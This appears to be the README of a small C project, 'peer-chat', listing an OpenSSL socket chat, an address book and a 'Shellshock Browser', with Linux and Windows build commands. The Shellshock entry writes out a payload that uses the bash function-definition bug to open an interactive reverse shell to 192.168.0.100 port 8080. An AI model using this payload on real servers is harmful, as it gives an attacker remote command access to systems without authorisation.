# peer-chat
* Server and Client OpenSSL Peer Socket Chat (Windows/Linux)

    most Bug free
    
* Addressbook functionality (Windows/Linux)

    Entry has Bugs
    
* http/https Shellshock Browser (Windows/Linux)

    the Shellshock it self: "env x='() { :;}; ' $(command -v bash) -i >& /dev/tcp/192.168.0.100/8080 0>&1"

# building
On Linux: gcc main.c -o peer-chat -lssl -lcrypto -pthread -std=gnu99

On Windows: use DevC++ (latest) WIN32/WIN64 Compiler

with linker options:

-mwindows
-lssl
-lcrypto
-leay32 
-lwsock32
-lws2_32 
-lpthread
-s

Code profiling -std=ISO C99
